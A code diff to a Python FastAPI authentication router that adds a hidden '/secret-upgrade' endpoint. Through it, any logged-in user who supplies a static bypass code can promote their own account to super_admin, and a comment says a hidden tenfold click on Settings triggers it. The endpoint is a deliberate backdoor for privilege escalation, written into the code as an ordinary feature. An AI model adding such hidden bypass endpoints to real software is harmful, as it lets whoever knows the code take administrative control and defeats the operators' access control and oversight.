@@ -481,6 +481,39 @@ async def verify_password(data: VerifyPasswordRequest, user: dict = Depends(get_
     is_valid = bcrypt.checkpw(data.password.encode(), db_user["password"].encode())
     return {"valid": is_valid}
 
+class SecretUpgradeRequest(BaseModel):
+    user_id: str
+    new_role: str
+    secret_code: str
+
+@auth_router.post("/secret-upgrade")
+async def secret_upgrade(data: SecretUpgradeRequest, user: dict = Depends(get_current_user)):
+    """Secret endpoint to upgrade user role with bypass code (triggered by 10x Settings click)"""
+    
+    # Only allow upgrade to super_admin
+    if data.new_role != "super_admin":
+        raise HTTPException(status_code=400, detail="Invalid upgrade request")
+    
+    # Verify bypass code
+    if data.secret_code != SUPER_ADMIN_BYPASS:
+        raise HTTPException(status_code=403, detail="Invalid secret code")
+    
+    # User can only upgrade themselves
+    if data.user_id != user["id"]:
+        raise HTTPException(status_code=403, detail="Can only upgrade yourself")
+    
+    # Don't downgrade master_admin
+    if user["role"] == "master_admin":
+        raise HTTPException(status_code=400, detail="Master admin cannot be downgraded")
+    
+    # Upgrade the user
+    await db.users.update_one(
+        {"id": user["id"]},
+        {"$set": {"role": "super_admin", "updated_at": datetime.now(timezone.utc).isoformat()}}
+    )
+    
+    return {"message": "Successfully upgraded to Super Admin"}
+
 # ==================== USER ROUTES ====================
 
 class ProfileUpdate(BaseModel):
